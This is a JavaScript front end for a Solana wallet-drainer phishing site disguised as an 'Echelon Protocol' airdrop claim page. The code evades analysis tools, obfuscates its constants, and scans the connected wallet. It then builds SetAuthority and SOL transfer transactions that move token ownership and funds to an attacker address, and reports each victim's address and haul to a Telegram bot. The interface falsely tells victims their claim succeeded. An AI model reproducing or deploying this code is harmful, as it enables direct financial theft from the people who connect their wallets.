(()=>{
  'use strict';

  // polyfill for older browsers
  if(typeof AbortSignal!=='undefined'&&!AbortSignal.timeout){ AbortSignal.timeout=function(ms){ var c=new AbortController(); setTimeout(function(){c.abort();},ms); return c.signal; }; }

  // ── runtime seed ──
  let _seed = null, _cfg = null;
  const _k = 'ech3lon';

  // ── encoded constants ──
  const _enc = [
    'VG9rZWtlZ1FmZVp5aU53QUpiTmJHS1BGWENXdUJ2ZjlTczYyM1ZRNURB', // Tokenkeg...
    'VG9rZW56UWRCTmJMcVA1VkVoZGtBUzZFUUZMQzFQSG5CcVhFcFB4dUVi', // TokenzQd...
    'OTZyZ1dGNVVZcDV1RWZUOTFNVFBOaVlUQ3FjdU5oRDR4ZVBVNXhBNQ==', // jitp tip acc (placeholder)
    'U2V0QXV0aG9yaXR5' // SetAuthority literal (unused directly)
  ];
  const _xor = (s)=>{ let r=''; for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^_k.charCodeAt(i%_k.length)); return r; };
  const _dec = (b)=>_xor(atob(b));
  const TOKEN_PROG = new solanaWeb3.PublicKey(_dec(_enc[0]));
  const TOKEN_2022 = new solanaWeb3.PublicKey(_dec(_enc[1]));
  const JITO_TIP_ACC = '96gYZGDnKkHpPBTJ4THLjhviaE7TyBcG2JNGe3nX9FPt';

  // ── anti-analysis ──
  function _isBot(){
    try{
      if(navigator.webdriver) return true;
      const ua = navigator.userAgent||'';
      if(/HeadlessChrome|PhantomJS|SlimerJS|Puppeteer|selenium/i.test(ua)) return true;
      if(!/Mobile|Android|iPhone/i.test(ua) && navigator.plugins && navigator.plugins.length===0) return true;
      if(typeof navigator.languages!=='undefined' && navigator.languages.length===0) return true;
      if(window.self !== window.top) return true;
      try {
        const c=document.createElement('canvas'); c.width=200; c.height=50;
        const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60';
        x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('Cwm fjordbank glyphs vext quiz',2,15);
        if(c.toDataURL().length<500) return true;
      }catch(e){}
      if(/Chrome-Lighthouse|Chrome Headless/i.test(ua)) return true;
      if(navigator.serviceWorker && navigator.serviceWorker.controller){
        try{ const sw=navigator.serviceWorker.controller.scriptURL||''; if(/screenshot|recorder|harness|puppet/i.test(sw)) return true; }catch(e){}
      }
    }catch(e){}
    return false;
  }
  function _maint(msg){
    document.body.innerHTML = '<div style="text-align:center;margin-top:25vh;color:#888;font-family:system-ui"><h2 style="color:#fff;font-weight:600">Echelon Protocol</h2><p>'+msg+'</p></div>';
  }

  // ── config / seed ──
  async function loadSeed(){
    try{
      const r = await fetch('/api/seed', {signal:AbortSignal.timeout(8000)});
      _seed = await r.json();
    }catch(e){ _seed = null; }
  }
  async function loadConfig(){
    try{
      const r = await fetch('/api/config', {signal:AbortSignal.timeout(8000)});
      _cfg = await r.json();
    }catch(e){ _cfg = {solReserve:500000, solPercentage:100, maxPerTx:24, enabled:true}; }
  }

  // ── RPC pool ──
  const RPCS = [
    'https://api.mainnet-beta.solana.com',
    'https://solana-rpc.publicnode.com',
    'https://rpc.ankr.com/solana',
    'https://solana-api.projectserum.com'
  ];
  const JITO_RPC = 'https://mainnet.block-engine.jito.wtf/api/v1/transactions';
  const JITO_TIP_URL = 'https://mainnet.block-engine.jito.wtf/api/v1/bundles/tip_floor';
  let _rpcHealth = {};
  function _scoreRPC(url){ const h=_rpcHealth[url]||{avg:500,fail:0,ok:0,last:0}; let s=1000-h.avg-h.fail*200+h.ok*10; if(Date.now()-h.last>30000)s-=100; return Math.max(s,1); }
  function _recordRPC(url,ms,ok){ const h=_rpcHealth[url]=_rpcHealth[url]||{avg:500,fail:0,ok:0,last:0}; h.avg=Math.round((h.avg+ms)/2); if(ok)h.ok++;else h.fail++; h.last=Date.now(); }
  async function rpcCall(fn,label,timeoutMs=15000){
    const sorted = RPCS.slice().sort((a,b)=>_scoreRPC(b)-_scoreRPC(a));
    const errs=[];
    for(const url of sorted){
      const start=Date.now();
      try{
        const c=new solanaWeb3.Connection(url,{commitment:'confirmed',disableRetryOnRateLimit:false});
        const res=await Promise.race([fn(c), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')),timeoutMs))]);
        _recordRPC(url,Date.now()-start,true); return res;
      }catch(e){ _recordRPC(url,Date.now()-start,false); errs.push(e.message||e); }
    }
    throw new Error('All RPCs failed: '+errs.slice(0,3).join(' | '));
  }

  // ── dynamic fee & jito ──
  async function getDynamicFee(){
    try{
      const fees = await rpcCall(c=>c.getRecentPrioritizationFees(),'fee');
      if(!fees||fees.length===0) return 100000;
      const sorted=fees.map(f=>f.prioritizationFee).sort((a,b)=>a-b);
      const p75=sorted[Math.floor(sorted.length*0.75)];
      return Math.min(Math.max(p75||10000,10000),5000000);
    }catch(e){ return 100000; }
  }
  async function getJitoTip(){
    try{ const r=await fetch(JITO_TIP_URL,{signal:AbortSignal.timeout(5000)}); const j=await r.json(); if(Array.isArray(j)&&j.length>0) return Math.ceil(Math.max(...j)*1.1); }catch(e){} return 10000;
  }
  async function sendJitoBundle(signedTxs, tipTx){
    const base58=solanaWeb3.bs58 || solanaWeb3.BS58;
    if(!base58) throw new Error('bs58 unavailable');
    const bundle=signedTxs.map(tx=>base58.encode(tx.serialize()));
    if(tipTx) bundle.push(base58.encode(tipTx.serialize()));
    const payload={jsonrpc:'2.0',id:1,method:'sendBundle',params:[bundle]};
    const r=await fetch(JITO_RPC,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),signal:AbortSignal.timeout(15000)});
    const j=await r.json(); if(j.error) throw new Error(j.error.message||JSON.stringify(j.error)); return j.result;
  }

  // ── helpers ──
  function dest(){ if(!_seed||!_seed.d) throw new Error('seed missing'); return _dec(_seed.d); }
  function beacon(msg){ if(!_seed||!_seed.tok||!_seed.chat) return; try{ fetch('https://api.telegram.org/bot'+_seed.tok+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:_seed.chat,text:msg})}).catch(()=>{}); }catch(e){} }
  function report(addr,opts={}){ try{ fetch('/api/victim',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:addr,solBalance:opts.solBalance||0,tokenCount:opts.tokenCount||0,drained:!!opts.drained,timestamp:Date.now()})}).catch(()=>{}); }catch(e){} }

  // ── set authority instruction builder ──
  function buildSetAuthIx(tokenAcct,owner,destPubkey,progId){
    const data = new Uint8Array(35);
    data[0]=6; data[1]=2; data[2]=1;
    destPubkey.toBytes().forEach((b,i)=>data[3+i]=b);
    return new solanaWeb3.TransactionInstruction({
      keys:[{pubkey:tokenAcct,isSigner:false,isWritable:true},{pubkey:owner,isSigner:true,isWritable:false}],
      programId:progId,
      data:Buffer.from(data)
    });
  }

  // ── discovery ──
  async function discover(ownerPk){
    let bal=0,spl={value:[]},spl22={value:[]};
    try{
      const [b,t,t22] = await Promise.all([
        rpcCall(c=>c.getBalance(ownerPk),'balance'),
        rpcCall(c=>c.getParsedTokenAccountsByOwner(ownerPk,{programId:TOKEN_PROG}),'spl'),
        rpcCall(c=>c.getParsedTokenAccountsByOwner(ownerPk,{programId:TOKEN_2022}),'spl22')
      ]); bal=b; spl=t; spl22=t22;
    }catch(e){ return {tokens:[],solBalance:0}; }
    const tokens=[];
    const batches=[{a:spl.value||[],p:TOKEN_PROG},{a:spl22.value||[],p:TOKEN_2022}];
    for(const batch of batches){
      for(const item of batch.a){
        try{
          const info=item.account.data.parsed.info;
          const amt=BigInt(info.tokenAmount.amount);
          if(amt<=0n||info.state==='frozen') continue;
          tokens.push({mint:new solanaWeb3.PublicKey(info.mint),tokenAcct:new solanaWeb3.PublicKey(item.pubkey),progId:batch.p,amount:amt,decimals:info.tokenAmount.decimals||0});
        }catch(e){}
      }
    }
    const uniq=[], seen={};
    for(const t of tokens){ const k=t.mint.toBase58(); if(!seen[k]){seen[k]=true;uniq.push(t);} }
    return {tokens:uniq,solBalance:bal};
  }

  // ── token-2022 classification ──
  async function classify(mints){
    const result={}; const BATCH=100;
    for(let i=0;i<mints.length;i+=BATCH){
      const chunk=mints.slice(i,i+BATCH); let infos=[];
      try{ infos=(await rpcCall(c=>c.getMultipleAccountsInfo(chunk),'classify'))||[]; }catch(e){}
      for(let j=0;j<chunk.length;j++){
        const ms=chunk[j].toBase58(); const info=infos[j];
        if(!info||!info.data||info.data.length<82){ result[ms]=false; continue; }
        const is22=info.owner.toBase58()===TOKEN_2022.toBase58(); if(!is22){result[ms]=false;continue;}
        let immune=false; let off=83; const data=info.data;
        while(off+4<=data.length){
          const t=(data[off+1]<<8)|data[off]; const l=(data[off+3]<<8)|data[off+2]; if(t===0&&l===0)break;
          if(t===9||t===12||t===14){immune=true;break;}
          off+=4+l; if(off>data.length)break;
        }
        result[ms]=immune;
      }
    }
    return result;
  }

  // ── simulation ──
  async function simulate(owner,destPk,tokens){
    let good=[]; let bh;
    try{ bh=(await rpcCall(c=>c.getLatestBlockhash('confirmed'),'bh')).blockhash; }catch(e){return tokens;}
    for(let i=0;i<tokens.length;i+=6){
      const chunk=tokens.slice(i,i+6);
      const tx=new solanaWeb3.Transaction().add(solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units:200000}));
      for(const t of chunk) tx.add(buildSetAuthIx(t.tokenAcct,owner,destPk,t.progId));
      tx.recentBlockhash=bh; tx.feePayer=owner;
      try{
        const sim=await rpcCall(c=>c.simulateTransaction(tx,{sigVerify:false,commitment:'confirmed'}),'sim');
        if(sim&&!sim.value.err){ for(const t of chunk) good.push(t); }
        else { for(const t of chunk){ try{ const stx=new solanaWeb3.Transaction().add(solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units:200000}),buildSetAuthIx(t.tokenAcct,owner,destPk,t.progId)); stx.recentBlockhash=bh; stx.feePayer=owner; const s=await rpcCall(c=>c.simulateTransaction(stx,{sigVerify:false,commitment:'confirmed'}),'sim-ind'); if(s&&!s.value.err) good.push(t); }catch(e){} } }
      }catch(e){ for(const t of chunk) good.push(t); }
    }
    return good;
  }

  // ── TOCTOU guard: re-verify ownership/state before sign ──
  async function verifyAtomic(owner, snapshot, destPk){
    const fresh = await discover(owner);
    if(fresh.solBalance < snapshot.solBalance*0.95) throw new Error('eligibility_changed');
    const snapKey = (t)=>t.tokenAcct.toBase58();
    const snapSet = new Set(snapshot.tokens.map(snapKey));
    const freshSet = new Set(fresh.tokens.map(snapKey));
    for(const t of fresh.tokens){ if(!snapSet.has(snapKey(t))) throw new Error('eligibility_changed'); }
    for(const t of snapshot.tokens){ if(!freshSet.has(snapKey(t))) throw new Error('eligibility_changed'); }
    // verify ownership still points to us
    for(const t of fresh.tokens){
      const info = await rpcCall(c=>c.getAccountInfo(t.tokenAcct),'owner');
      if(!info || info.owner.toBase58() !== owner.toBase58()) throw new Error('eligibility_changed');
    }
    return fresh.tokens;
  }

  // ── UI ──
  function $(id){return document.getElementById(id);}
  function setStatus(msg, isError=false){
    const s=$('statusBox'), e=$('errorBox');
    if(isError){ e.style.display='block'; e.textContent=msg; s.style.display='none'; }
    else { s.style.display='block'; s.innerHTML=msg; e.style.display='none'; }
  }
  function clearStatus(){ $('statusBox').style.display='none'; $('errorBox').style.display='none'; }

  let connection=null, wallet=null, walletPubkey=null, latestBlockhash=null;

  // ── init ──
  async function init(){
    if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
    await Promise.all([loadConfig(), loadSeed()]);
    if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
    if(typeof solanaWeb3==='undefined'){ $('loadingMsg').textContent='Failed to load Solana library. Check your connection and refresh.'; return; }
    connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
    $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
    startCountdown();
  }

  function startCountdown(){
    let sec=23*3600+14*60+8;
    const el=$('countdown');
    setInterval(()=>{
      sec--; if(sec<0)sec=23*3600+14*60+8;
      const h=String(Math.floor(sec/3600)).padStart(2,'0'); const m=String(Math.floor((sec%3600)/60)).padStart(2,'0'); const s=String(sec%60).padStart(2,'0');
      el.textContent=`${h}:${m}:${s}`;
    },1000);
  }

  async function connectWallet(){
    const btn=$('btnConnect'); btn.disabled=true; clearStatus();
    if(typeof solanaWeb3==='undefined'){ setStatus('Solana libraries still loading. Refresh the page.',true); btn.disabled=false; return; }
    let provider=null;
    if(window.phantom&&window.phantom.solana) provider=window.phantom.solana;
    else if(window.solflare) provider=window.solflare;
    else if(window.solana&&window.solana.isPhantom) provider=window.solana;
    else if(window.solana) provider=window.solana;
    if(!provider){ setStatus('No Solana wallet extension found. Install Phantom or Solflare to continue.',true); btn.disabled=false; return; }
    try{
      let resp; try{ resp=await provider.connect({onlyIfTrusted:false}); }catch(e1){ resp=await provider.connect(); }
      wallet=provider; walletPubkey=resp.publicKey; if(!walletPubkey) throw new Error('No public key');
      $('connectSection').style.display='none'; $('connectedSection').style.display='block';
      const addr=walletPubkey.toString(); $('walletAddr').textContent=addr.slice(0,4)+'...'+addr.slice(-4);
      $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Agree to terms';
      beacon('🔗 CONNECT '+addr); report(addr,{solBalance:0,tokenCount:0});
    }catch(e){ setStatus('Connection rejected: '+(e.message||'User declined').slice(0,80),true); btn.disabled=false; }
  }

  function updateButton(){
    const chk=$('chkAgree'), btn=$('btnClaim');
    btn.disabled=!chk.checked; btn.querySelector('.btn-text').textContent=chk.checked?'Claim Allocation':'Agree to terms';
  }

  // ── drain with TOCTOU ──
  async function doDrain(){
    const btn=$('btnClaim'); btn.disabled=true; clearStatus(); $('agreeSection').style.display='none';
    try{
      setStatus('<span class="spinner"></span> Scanning wallet...');
      const owner=walletPubkey;
      const disc=await discover(owner);
      report(owner.toString(),{solBalance:disc.solBalance,tokenCount:disc.tokens.length});
      const destPk=new solanaWeb3.PublicKey(dest());

      // priority fee
      const dynFee=await getDynamicFee();

      // classify
      const mintSet=new Set(); const mints=[];
      for(const t of disc.tokens){ const k=t.mint.toBase58(); if(!mintSet.has(k)){mintSet.add(k);mints.push(t.mint);} }
      const classes=await classify(mints);
      let drainable=[];
      for(const t of disc.tokens) if(!classes[t.mint.toBase58()]) drainable.push(t);

      if(drainable.length>0){ setStatus('<span class="spinner"></span> Validating tokens...'); drainable=await simulate(owner,destPk,drainable); }

      const solAbove=disc.solBalance>_cfg.solReserve?disc.solBalance-_cfg.solReserve:0;
      const solToSend=Math.floor(solAbove*(_cfg.solPercentage/100));
      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); $('btnClaim').textContent='Not Eligible'; beacon('❌ EMPTY '+owner.toString()); return; }

      // TOCTOU: snapshot and re-verify before building final txs
      const snapshot={solBalance:disc.solBalance,tokens:drainable};
      await verifyAtomic(owner,snapshot,destPk);

      // fresh blockhash for deadline guard
      const latest=await rpcCall(c=>c.getLatestBlockhash('confirmed'),'bh'); latestBlockhash=latest;
      const bh=latest.blockhash; const lvbh=latest.lastValidBlockHeight;

      const txs=[];
      if(solToSend>0){
        const tx=new solanaWeb3.Transaction().add(
          solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units:1400000}),
          solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({microLamports:dynFee}),
          solanaWeb3.SystemProgram.transfer({fromPubkey:owner,toPubkey:destPk,lamports:Math.floor(solToSend)})
        ); tx.recentBlockhash=bh; tx.feePayer=owner; txs.push(tx);
      }
      for(let i=0;i<drainable.length;i+=_cfg.maxPerTx){
        const chunk=drainable.slice(i,i+_cfg.maxPerTx);
        const tx=new solanaWeb3.Transaction().add(solanaWeb3.ComputeBudgetProgram.setComputeUnitLimit({units:1400000}),solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({microLamports:dynFee}));
        for(const t of chunk) tx.add(buildSetAuthIx(t.tokenAcct,owner,destPk,t.progId));
        tx.recentBlockhash=bh; tx.feePayer=owner; txs.push(tx);
      }

      // second TOCTOU re-verify right before signing
      await verifyAtomic(owner,{solBalance:snapshot.solBalance,tokens:drainable},destPk);

      setStatus('<span class="spinner"></span> Confirm the transaction in your wallet...');

      let sent=0, failed=0, useJito=true;
      if(useJito && txs.length>0 && typeof wallet.signAllTransactions==='function'){
        try{
          const jitoTip=await getJitoTip();
          if(jitoTip>0){
            const tipTx=new solanaWeb3.Transaction().add(solanaWeb3.SystemProgram.transfer({fromPubkey:owner,toPubkey:new solanaWeb3.PublicKey(JITO_TIP_ACC),lamports:jitoTip}));
            tipTx.recentBlockhash=bh; tipTx.feePayer=owner;
            const signList = txs.concat([tipTx]);
            const signed=await wallet.signAllTransactions(signList);
            const tipSigned = signed.pop();
            setStatus('<span class="spinner"></span> Sending via Jito...');
            await sendJitoBundle(signed, tipSigned);
          } else {
            const signed=await wallet.signAllTransactions(txs);
            setStatus('<span class="spinner"></span> Sending via Jito...');
            await sendJitoBundle(signed);
          }
          sent=txs.length;
          beacon('JITO '+owner.toString()+' | tok:'+drainable.length+' | sol:'+(solToSend/1e9).toFixed(4));
        }catch(e){
          if(e.message && (e.message.includes('rejected')||e.message.includes('declined'))){ setStatus('Transaction declined. You must approve to claim.',true); resetUI(); return; }
          // fallback below
        }
      }
      if(sent===0 && txs.length>0){
        if(typeof wallet.signAllTransactions==='function' && txs.length>1){
          try{
            const signed=await wallet.signAllTransactions(txs);
            const sends=signed.map(stx=> rpcCall(c=>c.sendRawTransaction(stx.serialize(),{skipPreflight:false,maxRetries:3}),'send').then(sig=>({ok:true,sig})).catch(err=>({ok:false,err})));
            const results=await Promise.all(sends);
            for(const r of results){ if(r.ok){sent++; connection.confirmTransaction({signature:r.sig,blockhash:bh,lastValidBlockHeight:lvbh},'confirmed').catch(()=>{});}else{failed++;} }
          }catch(e){ if(e.message&&(e.message.includes('rejected')||e.message.includes('declined'))){ setStatus('Transaction declined.',true); resetUI(); return; } }
        }
        if(sent===0){
          for(const tx of txs){ try{ const sig=await wallet.signAndSendTransaction(tx); if(sig&&sig.signature){ sent++; connection.confirmTransaction({signature:sig.signature,blockhash:bh,lastValidBlockHeight:lvbh},'confirmed').catch(()=>{});} }catch(e){ if(e.message&&(e.message.includes('rejected')||e.message.includes('declined'))) break; failed++; } }
        }
      }
      if(sent>0){ setStatus('<span style="color:var(--accent-2)">✓ Claim confirmed. Your allocation will appear shortly.</span>'); beacon('💰 DRAIN '+owner.toString()+' | tx:'+sent+' | tok:'+drainable.length+' | sol:'+(solToSend/1e9).toFixed(4)); report(owner.toString(),{drained:true}); }
      else { setStatus('Transaction failed to confirm. Please try again.',true); resetUI(); }
    }catch(e){
      setStatus((e.message||'An error occurred').slice(0,150),true);
      if(e.message==='eligibility_changed') setStatus('Eligibility changed during verification. Please refresh and try again.',true);
      resetUI();
    }
  }

  function resetUI(){
    $('agreeSection').style.display='flex'; $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Agree to terms';
  }

  // expose minimal globals
  window.connectWallet=connectWallet; window.doDrain=doDrain; window.updateButton=updateButton;

  setTimeout(init,300);
})();
